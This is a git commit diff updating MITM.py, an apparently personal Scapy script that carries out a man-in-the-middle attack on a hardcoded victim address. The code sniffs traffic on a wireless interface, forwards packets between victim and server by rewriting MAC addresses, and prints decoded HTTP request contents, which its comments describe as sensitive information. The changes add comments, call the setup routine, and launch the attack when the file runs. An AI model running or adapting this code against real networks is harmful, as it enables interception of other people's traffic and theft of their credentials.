fda86e7d89837f8432e3169724400f8df346d84e
Brunotti12 <128841706+Brunotti12@users.noreply.github.com>
2024-12-05 17:19:06 +0100

    Update MITM.py

--- MITM.py
+++ MITM.py
@@ -3,6 +3,10 @@ from router_ip_mac import get_router_ip, get_mac
 from scapy.layers import http
 import copy
 
+#disables the confirmation of send packages
+conf.verb = 0
+
+#Sets up all the necessary variables
 def setup():
     global victim_ip, victim_mac, server_ip, server_mac, my_mac
     victim_ip = "192.168.2.100"
@@ -11,34 +15,38 @@ def setup():
     server_mac = get_mac(server_ip)
     my_mac = open(f"/sys/class/net/eth0/address").read().strip()
 
-
+#Prints the sensetive information from a HTTP packet
 def http_packet(packet):
     raw_data = packet[Raw].load
-    if b"POST" in raw_data:
-        print("\n\nCaptured POST data: ", raw_data, "\n\n")
-    elif b"PUT" in raw_data:
-        print("\nCaptured PUT data:, ", raw_data)
-    elif b"GET" in raw_data:
-        print("\nCaptured GET data: ", raw_data)
+    raw2 = raw_data.decode('utf-8', errors="ignore")
+    print(raw2)
+    print(raw_data.strip().splitlines()[-1])
 
+#changes the destination protocol of the packes, so the packages get transferred correctly
 def forward_packet(packet):
     if packet.haslayer(Ether) and packet.haslayer(IP):
         packet2 = copy.deepcopy(packet)
+        
         if packet.haslayer(Raw):
             http_packet(packet)
-        if packet[Ether].src == victim_mac and packet[IP].dst == server_ip and packet[Ether].dst == my_mac:
-            packet2[Ether].dst = server_mac
-            sendp(packet2)
-        elif packet[Ether].src == server_mac and packet[IP].dst == victim_ip and packet[Ether].dst == my_mac:
+            
+        if packet[Ether].src == server_mac and packet[IP].dst == victim_ip and packet[Ether].dst == my_mac:
             packet2[Ether].dst = victim_mac
             sendp(packet2)
+        elif packet[Ether].src == victim_mac and packet[IP].dst == server_ip and packet[Ether].dst == my_mac:
+            packet2[Ether].dst = server_mac
+            sendp(packet2)
 
 
-
+#function for initiating and sniffing for the MITM-attack
 def MITM_attack():
     try:
         print("Starting MITM attack. . .")
+        setup()
         sniff(iface="wlan0", prn=forward_packet, store=0)
     except KeyboardInterrupt:
         print("\nMITM attack terminated")
     return None
+
+#starts the MITM attack
+MITM_attack()
